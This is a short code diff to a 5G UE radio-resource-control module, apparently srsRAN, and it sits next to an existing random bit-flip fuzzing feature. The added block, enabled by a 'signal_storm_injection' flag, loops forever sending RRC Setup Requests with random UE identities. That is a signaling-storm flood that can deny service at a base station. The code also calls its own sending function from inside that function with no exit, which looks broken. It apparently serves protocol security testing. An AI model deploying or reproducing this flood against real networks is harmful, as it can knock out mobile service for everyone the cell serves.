@@ -673,6 +673,30 @@ void rrc_nr::send_ul_ccch_msg(const asn1::rrc_nr::ul_ccch_msg_s& msg)
           pdu->msg[byte_to_flip] ^= (1 << bit_to_flip); // Flip a random bit in the buffer
     }
   }
+  
+    if (args.signal_storm_injection && (args.target_signal_attack == msg.msg.c1().type().to_string() || args.target_message == ""))
+  {
+    while (true) 
+    {
+        std::cout << "TestSignalAttack: " << std::endl;
+        logger.debug("Preparing RRC Setup Request");
+
+        // Prepare SetupRequest packet
+        ul_ccch_msg_s            ul_ccch_msg;
+        rrc_setup_request_ies_s* rrc_setup_req = &ul_ccch_msg.msg.set_c1().set_rrc_setup_request().rrc_setup_request;
+
+        // TODO: implement ng_minus5_g_s_tmsi_part1
+        rrc_setup_req->ue_id.set_random_value();
+        uint64_t random_id = srsran_random_uniform_int_dist(random_gen, 0, 12345);
+        for (uint i = 0; i < 5; i++) { // fill random ID bytewise, 40 bits = 5 bytes
+        random_id |= ((uint64_t)rand() & 0xFF) << i * 8;
+        }
+        rrc_setup_req->ue_id.random_value().from_number(random_id, rrc_setup_req->ue_id.random_value().length());
+        rrc_setup_req->establishment_cause = (establishment_cause_opts::options)cause;
+
+        send_ul_ccch_msg(ul_ccch_msg);
+    }
+  }
 
 
   rlc->write_sdu(lcid, std::move(pdu));
